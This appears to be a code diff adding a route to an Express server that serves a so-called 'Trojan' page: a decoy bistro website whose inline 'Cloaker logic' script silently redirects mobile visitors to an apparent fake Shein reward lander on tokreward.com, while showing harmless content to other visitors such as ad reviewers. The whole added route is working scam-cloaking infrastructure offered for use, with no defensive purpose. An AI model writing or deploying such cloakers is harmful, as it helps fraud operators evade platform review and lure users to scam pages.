@@ -1232,6 +1232,104 @@ app.get('/905/:slug', (req, res, next) => {
             console.log(`Served 905 Trojan (${slug})`);
 });
 
+// SHEIN BH FLUENT
+app.get('/876/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body {
+        font-family: 'Arial', sans-serif;
+        background-color: #2c3e50;
+        color: #ecf0f1;
+        margin: 0;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+    }
+    header {
+        background-color: #e74c3c;
+        padding: 1em;
+        text-align: center;
+    }
+    h1 {
+        font-size: 2em;
+        margin: 0;
+        text-transform: uppercase;
+    }
+    .content {
+        flex: 1;
+        padding: 2em;
+        max-width: 900px;
+        margin: 0 auto;
+    }
+    .featured-dish {
+        background-color: #34495e;
+        border-radius: 10px;
+        padding: 1em;
+        margin-bottom: 2em;
+    }
+    footer {
+        background-color: #e74c3c;
+        color: #ecf0f1;
+        padding: 1em;
+        text-align: center;
+    }
+    footer a {
+        color: #3498db;
+        text-decoration: none;
+    }
+    footer a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <header>
+        <h1>${slug} Bistro</h1>
+    </header>
+    
+    <div class="content">
+        <div class="featured-dish">
+            <p>Today's Special: <strong>${slug} Surprise Platter</strong></p>
+        </div>
+        
+        <h2>Savor the Flavor Revolution</h2>
+        <p>Welcome to a culinary journey that defies expectations. Our innovative menu pushes the boundaries of taste.</p>
+        
+        <h3>Our Gastronomy Principles:</h3>
+        <ul>
+            <li>Farm-fresh, locally sourced ingredients</li>
+            <li>Fusion of global cuisines</li>
+            <li>Molecular gastronomy techniques</li>
+        </ul>
+    </div>
+    <footer>
+        <p>Indulge in culinary artistry &copy; 2024 ${slug} Bistro | <a href="https://tokreward.com/pp.html">Privacy Pledge</a></p>
+    </footer>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 876 Trojan (${slug})`);
+});
 
 // DUDDV3 CLOAKER
 app.get('/duddv3/:slug', (req, res, next) => {
